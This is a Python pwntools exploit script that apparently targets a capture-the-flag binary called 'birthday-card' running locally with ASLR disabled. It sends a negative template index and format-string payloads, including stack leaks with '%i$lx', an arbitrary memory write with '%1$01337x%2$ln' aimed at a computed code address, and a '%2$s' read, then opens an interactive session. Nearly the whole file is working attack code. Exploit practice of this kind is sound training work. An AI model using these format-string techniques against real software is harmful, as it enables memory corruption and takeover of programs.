#!/usr/bin/env python3

from pwn import *

r = process('./container/birthday-card', level='info', aslr=False)
r.recvline_contains('4. Exit')
r.sendline('A'*15)


r.recvline_contains('4. Exit')
r.sendline(str(1))

#r.recvuntil('Who is the card for? ')
r.sendline('ZetaTwo')
#r.recvuntil('How old are they turning? ')
r.sendline(str(1))

r.recvline_contains('4. Exit')
r.sendline(str(2))

r.recvline_contains('Please choose a template')
r.sendline(str(-2147483647))

"""
for i in range(1, 10):
    r.recvline_contains('4. Exit')
    r.sendline(str(1))

    #r.recvuntil('Who is the card for? ')
    r.sendline(f'%{i}$lx')
    #r.recvuntil('How old are they turning? ')
    r.sendline(str(0x555555554000 + 0x5040))

    r.recvline_contains('4. Exit')
    r.sendline(str(3))

    r.recvline_contains('Here is your birthday card, enjoy!')
    leak = r.recvline()
    print(i, leak)
"""

r.recvline_contains('4. Exit')
r.sendline(str(1))

#r.recvuntil('Who is the card for? ')
r.sendline(f'%1$01337x%2$ln')
#r.sendline(f'AAA%2$ln')
#r.recvuntil('How old are they turning? ')
r.sendline(str(0x555555554000 + 0x5040 + 0x10))

r.recvline_contains('4. Exit')
r.sendline(str(3))

r.recvline_contains('Here is your birthday card, enjoy!')
leak = r.recvline()
print(leak)

"""
r.recvline_contains('4. Exit')
r.sendline(str(1))

#r.recvuntil('Who is the card for? ')
r.sendline(f'%2$s')
#r.recvuntil('How old are they turning? ')
r.sendline(str(1))

r.recvline_contains('4. Exit')
r.sendline(str(3))

r.recvline_contains('Here is your birthday card, enjoy!')
leak = r.recvline()
print(leak)
"""


r.interactive()
